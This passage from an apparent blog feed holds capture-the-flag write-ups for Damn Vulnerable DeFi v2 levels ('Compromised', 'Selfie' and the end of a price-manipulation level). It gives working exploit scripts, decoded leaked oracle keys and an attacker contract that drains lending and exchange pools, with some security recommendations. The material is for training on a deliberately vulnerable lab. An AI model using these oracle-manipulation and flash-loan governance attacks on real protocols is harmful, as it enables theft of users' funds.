exchange</span></span><br><span class="line">    <span class="keyword">await</span> <span class="variable language_">this</span>.<span class="property">token</span>.<span class="title function_">connect</span>(attacker).<span class="title function_">approve</span>( <span class="variable language_">this</span>.<span class="property">uniswapExchange</span>.<span class="property">address</span>, <span class="variable constant_">ATTACKER_INITIAL_TOKEN_BALANCE</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">//Buy as many ETH as possible with attackers available DVT token, this will break the 1:1 ratio</span></span><br><span class="line">    <span class="comment">// drives down the needed collateral drastically</span></span><br><span class="line">    <span class="keyword">const</span> tx = <span class="keyword">await</span> <span class="variable language_">this</span>.<span class="property">uniswapExchange</span>.<span class="title function_">connect</span>(attacker).<span class="title function_">tokenToEthSwapOutput</span>(ethers.<span class="property">utils</span>.<span class="title function_">parseEther</span>(<span class="string">&#x27;9.9&#x27;</span>),</span><br><span class="line">        <span class="variable constant_">ATTACKER_INITIAL_TOKEN_BALANCE</span>,</span><br><span class="line">        (<span class="keyword">await</span> ethers.<span class="property">provider</span>.<span class="title function_">getBlock</span>(<span class="string">&#x27;latest&#x27;</span>)).<span class="property">timestamp</span> * <span class="number">2</span>,</span><br><span class="line">        &#123; <span class="attr">gasLimit</span>: <span class="number">1e6</span> &#125;</span><br><span class="line">    );</span><br><span class="line">    <span class="keyword">await</span> tx.<span class="title function_">wait</span>();</span><br><span class="line"></span><br><span class="line">    <span class="keyword">const</span> depositRequired = <span class="keyword">await</span> <span class="variable language_">this</span>.<span class="property">lendingPool</span>.<span class="title function_">calculateDepositRequired</span>(<span class="variable constant_">POOL_INITIAL_TOKEN_BALANCE</span>);</span><br><span class="line">    <span class="title function_">expect</span>(depositRequired &lt; <span class="variable constant_">ATTACKER_INITIAL_ETH_BALANCE</span>).<span class="property">to</span>.<span class="property">be</span>.<span class="property">true</span>;</span><br><span class="line">    <span class="comment">// borrow the max amount of token</span></span><br><span class="line">    <span class="keyword">await</span> <span class="variable language_">this</span>.<span class="property">lendingPool</span>.<span class="title function_">connect</span>(attacker).<span class="title function_">borrow</span>(<span class="variable constant_">POOL_INITIAL_TOKEN_BALANCE</span>, &#123;<span class="attr">value</span>: depositRequired&#125;)</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> 05.Damn Vulnerable DeFi v2 CTF </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>07.Compromised</title>
      <link href="/2023/06/23/05.Damn%20Vulnerable%20DeFi%20v2%20CTF/07.Compromised/"/>
      <url>/2023/06/23/05.Damn%20Vulnerable%20DeFi%20v2%20CTF/07.Compromised/</url>
      
        <content type="html"><![CDATA[<h1 id="Compromised"><a href="#Compromised" class="headerlink" title="Compromised"></a>Compromised</h1><h2 id="analyse"><a href="#analyse" class="headerlink" title="analyse"></a>analyse</h2><blockquote><p>While poking around a web service of one of the most popular DeFi projects in the space, you get a somewhat strange response from their server. Here’s a snippet:</p></blockquote><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">HTTP/2 200 OK</span><br><span class="line">content-type: text/html</span><br><span class="line">content-language: en</span><br><span class="line">vary: Accept-Encoding</span><br><span class="line">server: cloudflare</span><br><span class="line"></span><br><span class="line">4d 48 68 6a 4e 6a 63 34 5a 57 59 78 59 57 45 30 4e 54 5a 6b 59 54 59 31 59 7a 5a 6d 59 7a 55 34 4e 6a 46 6b 4e 44 51 34 4f 54 4a 6a 5a 47 5a 68 59 7a 42 6a 4e 6d 4d 34 59 7a 49 31 4e 6a 42 69 5a 6a 42 6a 4f 57 5a 69 59 32 52 68 5a 54 4a 6d 4e 44 63 7a 4e 57 45 35</span><br><span class="line"></span><br><span class="line">4d 48 67 79 4d 44 67 79 4e 44 4a 6a 4e 44 42 68 59 32 52 6d 59 54 6c 6c 5a 44 67 34 4f 57 55 32 4f 44 56 6a 4d 6a 4d 31 4e 44 64 68 59 32 4a 6c 5a 44 6c 69 5a 57 5a 6a 4e 6a 41 7a 4e 7a 46 6c 4f 54 67 33 4e 57 5a 69 59 32 51 33 4d 7a 59 7a 4e 44 42 69 59 6a 51 34</span><br></pre></td></tr></table></figure><blockquote><p>A related on-chain exchange is selling (absurdly overpriced) collectibles called “DVNFT”, now at 999 ETH each.</p><p>This price is fetched from an on-chain oracle, based on 3 trusted reporters: <code>0xA732...A105</code>,<code>0xe924...9D15</code> and <code>0x81A5...850c</code>.</p><p>Starting with just 0.1 ETH in balance, pass the challenge by obtaining all ETH available in the exchange.</p></blockquote><h3 id="the-whole-analyse"><a href="#the-whole-analyse" class="headerlink" title="the whole analyse"></a>the whole analyse</h3><ul><li><p>Exchange：it is a NFT trading institution. we can buy and sell NFT from it. The price of NFT in this store is depended on the Oracle.</p></li><li><p>TrustfulOracle：This is an oracle contract. it will post the price of the NFT in the traing institution. Anyone could get the information from the oracle but only the trusted source and initializer can change the price of the NFT</p></li><li>TrustfulOracleInitializer：it is just an Initializing contract, not containing important content.</li></ul><h3 id="vulnerable-analyse"><a href="#vulnerable-analyse" class="headerlink" title="vulnerable analyse"></a>vulnerable analyse</h3><p>This level is quite different from the levels we met before. When we completely studied the code, we have learned the whole logic of this topic. But we found that it is Impeccable: we need to buy a NFT but one NFT worths 999 ETH that we cant pay with enough money. From the code, one possible solution is to change the price to an very low price and buy it. All we can do is to call the function function <code>postPrice()</code>.</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">function postPrice(string calldata symbol, uint256 newPrice) external onlyTrustedSource &#123;</span><br><span class="line">_setPrice(msg.sender, symbol, newPrice);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">modifier onlyTrustedSource() &#123;</span><br><span class="line">    require(hasRole(TRUSTED_SOURCE_ROLE, msg.sender));</span><br><span class="line">    _;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>but only the trustedSource can call it. From the <code>compromised.challenge.js</code> we know that the sources is the three of them.</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> sources = [</span><br><span class="line">    <span class="string">&#x27;0xA73209FB1a42495120166736362A1DfA9F95A105&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;0xe92401A4d3af5E446d93D11EEc806b1462b39D15&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;0x81A5D6E50C214044bE44cA0CB057fe119097850c&#x27;</span></span><br><span class="line">];</span><br></pre></td></tr></table></figure><p>Once finding their private key, we can control the oracle and change the price. By the way, we at least need 2 private keys to change the price since the function <code>_sort()</code>, <code>_computeMedianPrice()</code>, <code>getMedianPrice()</code>, We choose the median as the final price.</p><h3 id="tips-analyse"><a href="#tips-analyse" class="headerlink" title="tips analyse"></a>tips analyse</h3><p>from the tips the level privides to us, we found it very strange. It is some numbers. What if they are substitutes for private keys? I mean they can be translated into private keys. In the internet, leakage events of private key often happents, they flow on the network as binary streams like this. In this tips, the form of the number is bytes, now we translate it into string(ASCII)：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">decode</span><br><span class="line"></span><br><span class="line">original data</span><br><span class="line">4d 48 68 6a 4e 6a 63 34 5a 57 59 78 59 57 45 30 4e 54 5a 6b 59 54 59 31 59 7a 5a 6d 59 7a 55 34 4e 6a 46 6b 4e 44 51 34 4f 54 4a 6a 5a 47 5a 68 59 7a 42 6a 4e 6d 4d 34 59 7a 49 31 4e 6a 42 69 5a 6a 42 6a 4f 57 5a 69 59 32 52 68 5a 54 4a 6d 4e 44 63 7a 4e 57 45 35</span><br><span class="line"></span><br><span class="line">4d 48 67 79 4d 44 67 79 4e 44 4a 6a 4e 44 42 68 59 32 52 6d 59 54 6c 6c 5a 44 67 34 4f 57 55 32 4f 44 56 6a 4d 6a 4d 31 4e 44 64 68 59 32 4a 6c 5a 44 6c 69 5a 57 5a 6a 4e 6a 41 7a 4e 7a 46 6c 4f 54 67 33 4e 57 5a 69 59 32 51 33 4d 7a 59 7a 4e 44 42 69 59 6a 51 34</span><br><span class="line"></span><br><span class="line">####################################################################################################</span><br><span class="line">bytes  ====ASCII====&gt; string</span><br><span class="line">this is the site that it can help you translate:</span><br><span class="line">https://onlinestringtools.com/convert-bytes-to-string</span><br><span class="line">####################################################################################################</span><br><span class="line"></span><br><span class="line">translated data</span><br><span class="line">MHhjNjc4ZWYxYWE0NTZkYTY1YzZmYzU4NjFkNDQ4OTJjZGZhYzBjNmM4YzI1NjBiZjBjOWZiY2RhZTJmNDczNWE5</span><br><span class="line"></span><br><span class="line">MHgyMDgyNDJjNDBhY2RmYTllZDg4OWU2ODVjMjM1NDdhY2JlZDliZWZjNjAzNzFlOTg3NWZiY2Q3MzYzNDBiYjQ4</span><br></pre></td></tr></table></figure><p>This does not look like a private key, yet. We are looking for something that starts with <code>0x</code> followed by 64 random hex characters. Although it does look like some encoded data. And what encoding would someone use to transfer (binary) data across networks? That has to be Base64. Passing it to a Base64 decoder we get :</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">decode</span><br><span class="line"></span><br><span class="line">original data</span><br><span class="line">MHhjNjc4ZWYxYWE0NTZkYTY1YzZmYzU4NjFkNDQ4OTJjZGZhYzBjNmM4YzI1NjBiZjBjOWZiY2RhZTJmNDczNWE5</span><br><span class="line"></span><br><span class="line">MHgyMDgyNDJjNDBhY2RmYTllZDg4OWU2ODVjMjM1NDdhY2JlZDliZWZjNjAzNzFlOTg3NWZiY2Q3MzYzNDBiYjQ4</span><br><span class="line"></span><br><span class="line">####################################################################################################</span><br><span class="line">string  ====Base64====&gt; string</span><br><span class="line">this is the site that it can help you translate:</span><br><span class="line">https://www.base64decode.org/</span><br><span class="line">####################################################################################################</span><br><span class="line"></span><br><span class="line">translated data</span><br><span class="line">0xc678ef1aa456da65c6fc5861d44892cdfac0c6c8c2560bf0c9fbcdae2f4735a9</span><br><span class="line"></span><br><span class="line">0x208242c40acdfa9ed889e685c23547acbed9befc60371e9875fbcd736340bb48</span><br></pre></td></tr></table></figure><p>now we get two private keys! That means that we can change the price in the oracle contract. </p><h3 id="change-price-and-buy-NFT"><a href="#change-price-and-buy-NFT" class="headerlink" title="change price and buy NFT"></a>change price and buy NFT</h3><p>1.create wallet by private keys</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//create wallet by private keys</span></span><br><span class="line">   <span class="keyword">const</span> sources1 = <span class="keyword">new</span> ethers.<span class="title class_">Wallet</span>(<span class="string">&quot;0xc678ef1aa456da65c6fc5861d44892cdfac0c6c8c2560bf0c9fbcdae2f4735a9&quot;</span>, ethers.<span class="property">provider</span>);</span><br><span class="line">   <span class="keyword">const</span> sources2 = <span class="keyword">new</span> ethers.<span class="title class_">Wallet</span>(<span class="string">&quot;0x208242c40acdfa9ed889e685c23547acbed9befc60371e9875fbcd736340bb48&quot;</span>, ethers.<span class="property">provider</span>);</span><br></pre></td></tr></table></figure><p>2.set the price to 1 wei</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//set the price to 1 wei</span></span><br><span class="line"><span class="keyword">await</span> <span class="variable language_">this</span>.<span class="property">oracle</span>.<span class="title function_">connect</span>(sources1).<span class="title function_">postPrice</span>(<span class="string">&quot;DVNFT&quot;</span>, <span class="number">1</span>);</span><br><span class="line"><span class="keyword">await</span> <span class="variable language_">this</span>.<span class="property">oracle</span>.<span class="title function_">connect</span>(sources2).<span class="title function_">postPrice</span>(<span class="string">&quot;DVNFT&quot;</span>, <span class="number">1</span>);</span><br></pre></td></tr></table></figure><p>3.buy a NFT</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//buy a NFT</span></span><br><span class="line"><span class="keyword">await</span> <span class="variable language_">this</span>.<span class="property">exchange</span>.<span class="title function_">connect</span>(attacker).<span class="title function_">buyOne</span>(&#123;<span class="attr">value</span>:<span class="number">1</span>&#125;);</span><br></pre></td></tr></table></figure><p>4.change the price to the exchange contract’s balance so that exchange contract can sell it</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//change the price to the exchange contract&#x27;s balance so that exchange contract can sell it</span></span><br><span class="line">_balance =  ethers.<span class="property">provider</span>.<span class="title function_">getBalance</span>(<span class="variable language_">this</span>.<span class="property">exchange</span>.<span class="property">address</span>);</span><br><span class="line"><span class="keyword">await</span> <span class="variable language_">this</span>.<span class="property">oracle</span>.<span class="title function_">connect</span>(sources1).<span class="title function_">postPrice</span>(<span class="string">&quot;DVNFT&quot;</span>, _balance);</span><br><span class="line"><span class="keyword">await</span> <span class="variable language_">this</span>.<span class="property">oracle</span>.<span class="title function_">connect</span>(sources2).<span class="title function_">postPrice</span>(<span class="string">&quot;DVNFT&quot;</span>, _balance);</span><br></pre></td></tr></table></figure><p>5.sell the NFT</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//sell the NFT</span></span><br><span class="line"><span class="keyword">await</span> <span class="variable language_">this</span>.<span class="property">nftToken</span>.<span class="title function_">connect</span>(attacker).<span class="title function_">approve</span>(<span class="variable language_">this</span>.<span class="property">exchange</span>.<span class="property">address</span>, <span class="number">0</span>);</span><br><span class="line"><span class="keyword">await</span> <span class="variable language_">this</span>.<span class="property">exchange</span>.<span class="title function_">connect</span>(attacker).<span class="title function_">sellOne</span>(<span class="number">0</span>);</span><br></pre></td></tr></table></figure><p>6.restore the initial price</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//restore the initial price</span></span><br><span class="line"><span class="keyword">await</span> <span class="variable language_">this</span>.<span class="property">oracle</span>.<span class="title function_">connect</span>(sources1).<span class="title function_">postPrice</span>(<span class="string">&quot;DVNFT&quot;</span>, <span class="variable constant_">INITIAL_NFT_PRICE</span>);</span><br><span class="line"><span class="keyword">await</span> <span class="variable language_">this</span>.<span class="property">oracle</span>.<span class="title function_">connect</span>(sources2).<span class="title function_">postPrice</span>(<span class="string">&quot;DVNFT&quot;</span>, <span class="variable constant_">INITIAL_NFT_PRICE</span>);</span><br></pre></td></tr></table></figure><h2 id="solution"><a href="#solution" class="headerlink" title="solution"></a>solution</h2><ul><li>test</li></ul><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_">it</span>(<span class="string">&#x27;Exploit&#x27;</span>, <span class="keyword">async</span> <span class="keyword">function</span> (<span class="params"></span>) &#123;        </span><br><span class="line">    <span class="comment">/** CODE YOUR EXPLOIT HERE */</span></span><br><span class="line">    <span class="comment">//create wallet by private keys</span></span><br><span class="line">    <span class="keyword">const</span> sources1 = <span class="keyword">new</span> ethers.<span class="title class_">Wallet</span>(<span class="string">&quot;0xc678ef1aa456da65c6fc5861d44892cdfac0c6c8c2560bf0c9fbcdae2f4735a9&quot;</span>, ethers.<span class="property">provider</span>);</span><br><span class="line">    <span class="keyword">const</span> sources2 = <span class="keyword">new</span> ethers.<span class="title class_">Wallet</span>(<span class="string">&quot;0x208242c40acdfa9ed889e685c23547acbed9befc60371e9875fbcd736340bb48&quot;</span>, ethers.<span class="property">provider</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">//set the price to 1 wei</span></span><br><span class="line">    <span class="keyword">await</span> <span class="variable language_">this</span>.<span class="property">oracle</span>.<span class="title function_">connect</span>(sources1).<span class="title function_">postPrice</span>(<span class="string">&quot;DVNFT&quot;</span>, <span class="number">1</span>);</span><br><span class="line">    <span class="keyword">await</span> <span class="variable language_">this</span>.<span class="property">oracle</span>.<span class="title function_">connect</span>(sources2).<span class="title function_">postPrice</span>(<span class="string">&quot;DVNFT&quot;</span>, <span class="number">1</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">//buy a NFT</span></span><br><span class="line">    <span class="keyword">await</span> <span class="variable language_">this</span>.<span class="property">exchange</span>.<span class="title function_">connect</span>(attacker).<span class="title function_">buyOne</span>(&#123;<span class="attr">value</span>:<span class="number">1</span>&#125;);</span><br><span class="line"></span><br><span class="line">    <span class="comment">//change the price to the exchange contract&#x27;s balance so that exchange contract can sell it</span></span><br><span class="line">    _balance =  ethers.<span class="property">provider</span>.<span class="title function_">getBalance</span>(<span class="variable language_">this</span>.<span class="property">exchange</span>.<span class="property">address</span>);</span><br><span class="line">    <span class="keyword">await</span> <span class="variable language_">this</span>.<span class="property">oracle</span>.<span class="title function_">connect</span>(sources1).<span class="title function_">postPrice</span>(<span class="string">&quot;DVNFT&quot;</span>, _balance);</span><br><span class="line">    <span class="keyword">await</span> <span class="variable language_">this</span>.<span class="property">oracle</span>.<span class="title function_">connect</span>(sources2).<span class="title function_">postPrice</span>(<span class="string">&quot;DVNFT&quot;</span>, _balance);</span><br><span class="line"></span><br><span class="line">    <span class="comment">//sell the NFT</span></span><br><span class="line">    <span class="keyword">await</span> <span class="variable language_">this</span>.<span class="property">nftToken</span>.<span class="title function_">connect</span>(attacker).<span class="title function_">approve</span>(<span class="variable language_">this</span>.<span class="property">exchange</span>.<span class="property">address</span>, <span class="number">0</span>);</span><br><span class="line">    <span class="keyword">await</span> <span class="variable language_">this</span>.<span class="property">exchange</span>.<span class="title function_">connect</span>(attacker).<span class="title function_">sellOne</span>(<span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">//restore the initial price</span></span><br><span class="line">    <span class="keyword">await</span> <span class="variable language_">this</span>.<span class="property">oracle</span>.<span class="title function_">connect</span>(sources1).<span class="title function_">postPrice</span>(<span class="string">&quot;DVNFT&quot;</span>, <span class="variable constant_">INITIAL_NFT_PRICE</span>);</span><br><span class="line">    <span class="keyword">await</span> <span class="variable language_">this</span>.<span class="property">oracle</span>.<span class="title function_">connect</span>(sources2).<span class="title function_">postPrice</span>(<span class="string">&quot;DVNFT&quot;</span>, <span class="variable constant_">INITIAL_NFT_PRICE</span>);</span><br><span class="line"></span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure><h2 id="Recommendations"><a href="#Recommendations" class="headerlink" title="Recommendations"></a>Recommendations</h2><p>Don’t store sensitive data onto any blockchain. Not even if it’s encoded. If someone can benefit from that information, it will be decoded for profit. Remember that one of the main aspects of the blockchains are that they intend to be transparent, meaning that all the information is public and reachable.</p><p>Also, never share your private keys or store them online. If you have to store them anywhere, try to do it on cold storage (something that is not connected to the internet) like a USB drive and keep it safe.</p><p>Here’s an <a href="https://consensys.github.io/smart-contract-best-practices/attacks/oracle-manipulation/">article</a> written by the highly reputable blockchain security company Consensys that presents some vulnerabilities and common pitfalls around oracles and price manipulation.</p>]]></content>
      
      
      <categories>
          
          <category> 05.Damn Vulnerable DeFi v2 CTF </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>06.Selfie</title>
      <link href="/2023/06/23/05.Damn%20Vulnerable%20DeFi%20v2%20CTF/06.Selfie/"/>
      <url>/2023/06/23/05.Damn%20Vulnerable%20DeFi%20v2%20CTF/06.Selfie/</url>
      
        <content type="html"><![CDATA[<h1 id="Selfie"><a href="#Selfie" class="headerlink" title="Selfie"></a>Selfie</h1><h2 id="analyse"><a href="#analyse" class="headerlink" title="analyse"></a>analyse</h2><blockquote><p>A new cool lending pool has launched! It’s now offering flash loans of DVT tokens. Wow, and it even includes a really fancy governance mechanism to control it. What could go wrong, right? You start with no DVT tokens in balance, and the pool has 1.5 million. Your objective: take them all.</p></blockquote><h3 id="the-whole-business-analyse"><a href="#the-whole-business-analyse" class="headerlink" title="the whole business analyse"></a>the whole business analyse</h3><ul><li>SelfiePool：This is a flashloan pool. Not only  can we call flashloan() in this contract, but we can also call drainAllFunds() which can be called after passing the modifier <code>onlyGovernance</code>. Analyse the topic, we can learn that we should call drainAllFunds() to pass this level</li><li>SimpleGovernance：This is the main contract. It is a governing contract, anyone can call queueAction to put a motion in the execution queue after we have got enough Snaptshot. And then the motions will be executed one by one.</li><li>DamnValuableTokenSnapshot：ERC20 token, having the snapshot ability.</li></ul><h3 id="flashloan-analyse"><a href="#flashloan-analyse" class="headerlink" title="flashloan analyse"></a>flashloan analyse</h3><p>From the whole business analyse, i have an idea to complete this level: get a lot of money by flashloan =&gt; take a snapshot =&gt;  put our malicious motion to the queue(contain the drainAllFunds() payloan) =&gt; Transfer tokens back to pool =&gt; wait for 2 days  =&gt; exectute our motion and steal the money =&gt; transfer the money to the attacker wallet</p><p>1.we can flashloan a lot of money to take a snapshot so that we can get enough snapShot token, so we can pass this code:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">require(_hasEnoughVotes(msg.sender), &quot;Not enough votes to propose an action&quot;);</span><br><span class="line"></span><br><span class="line">function _hasEnoughVotes(address account) private view returns (bool) &#123;</span><br><span class="line">    uint256 balance = governanceToken.getBalanceAtLastSnapshot(account);</span><br><span class="line">    uint256 halfTotalSupply = governanceToken.getTotalSupplyAtLastSnapshot() / 2;</span><br><span class="line">    return balance &gt; halfTotalSupply;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>2.put our malicious motion to the queue(contain the drainAllFunds() payloan): the queueAction needs a payload as parameter, it completely depends on us. So we can call the drainAllFunds(). Then the governance would call this function to drain all the funds to us while it can pass the modifier <code>onlyGovernance</code>.</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">//create a malicious payload</span><br><span class="line">bytes memory data = abi.encodeWithSignature(&quot;drainAllFunds(address)&quot;, address(this));</span><br><span class="line">// Use tokens to queue a new action</span><br><span class="line">governance.queueAction(address(selfiePool), data, 0);</span><br></pre></td></tr></table></figure><p>3.Transfer tokens back to pool</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">DVT.transfer(address(selfiePool), _amount);</span><br></pre></td></tr></table></figure><p>4.wait for two days</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// Travel through time (2 days) in order to execute the queued action.</span></span><br><span class="line"><span class="keyword">await</span> ethers.<span class="property">provider</span>.<span class="title function_">send</span>(<span class="string">&#x27;evm_increaseTime&#x27;</span>, [<span class="number">2</span> * <span class="number">24</span> * <span class="number">60</span> * <span class="number">60</span>])</span><br></pre></td></tr></table></figure><p>5.exectute our motion and steal the money . transfer the money to the attacker wallet</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">function attack_2daysLater(uint actionId) external &#123;</span><br><span class="line">    require(msg.sender == owner);</span><br><span class="line">    governance.executeAction(actionId);</span><br><span class="line">    DVT.transfer(msg.sender, DVT.balanceOf(address(this)));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">function executeAction(uint256 actionId) external payable &#123;</span><br><span class="line">    require(_canBeExecuted(actionId), &quot;Cannot execute this action&quot;);</span><br><span class="line"></span><br><span class="line">    GovernanceAction storage actionToExecute = actions[actionId];</span><br><span class="line">    actionToExecute.executedAt = block.timestamp;</span><br><span class="line"></span><br><span class="line">    actionToExecute.receiver.functionCallWithValue(</span><br><span class="line">    actionToExecute.data,</span><br><span class="line">    actionToExecute.weiAmount</span><br><span class="line">    );</span><br><span class="line"></span><br><span class="line">    emit ActionExecuted(actionId, msg.sender);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="vulnerability"><a href="#vulnerability" class="headerlink" title="vulnerability"></a>vulnerability</h3><p>Once again, like in some of the previous levels, the vulnerability lies inside the contract implementation, that allows any receiver contract to perform a malicious action.</p><p><strong>Don’t trust other contracts blindly.</strong> Be careful of what you allow your contracts to do on external calls. The implementation of this protocol is vulnerable because it delegates an execution to an unknown external contract, and opens a backdoor for possible attacks.</p><p>Besides, since the vast majority of the Governance tokens are stored on a singular address (the <em>SelfiePool</em> contract<em>),</em> and is not well distributed among several accounts/addresses, the protocol has a single point of failure, making the attack easier.</p><p>Here’s <a href="https://blog.openzeppelin.com/smart-contract-security-guidelines-4-strategies-for-safer-governance-systems/">a good article</a> from the highly reputable blockchain security company OpenZeppelin that should help you learn more about strategies and best practices for safer governance systems.</p><h2 id="solution"><a href="#solution" class="headerlink" title="solution"></a>solution</h2><ul><li>SelfieAttacker</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line">pragma solidity ^0.8.0;</span><br><span class="line"></span><br><span class="line">import &quot;../selfie/SimpleGovernance.sol&quot;;</span><br><span class="line">import &quot;../selfie/SelfiePool.sol&quot;;</span><br><span class="line">import &quot;../DamnValuableTokenSnapshot.sol&quot;;</span><br><span class="line"></span><br><span class="line">contract SelfieAttacker &#123;</span><br><span class="line">    SelfiePool immutable selfiePool;</span><br><span class="line">    SimpleGovernance immutable governance;</span><br><span class="line">    DamnValuableTokenSnapshot immutable DVT;</span><br><span class="line">    address immutable owner;</span><br><span class="line"></span><br><span class="line">    constructor(</span><br><span class="line">        address _selfiePool,</span><br><span class="line">        address _governance,</span><br><span class="line">        address _dvt</span><br><span class="line">    ) &#123;</span><br><span class="line">        selfiePool = SelfiePool(_selfiePool);</span><br><span class="line">        governance = SimpleGovernance(_governance);</span><br><span class="line">        DVT = DamnValuableTokenSnapshot(_dvt);</span><br><span class="line">        owner = msg.sender;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function attack_flashloan(uint256 borrowAmount) external &#123;</span><br><span class="line">        require(msg.sender == owner);</span><br><span class="line">        selfiePool.flashLoan(borrowAmount);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function receiveTokens(address _token, uint256 _amount) external 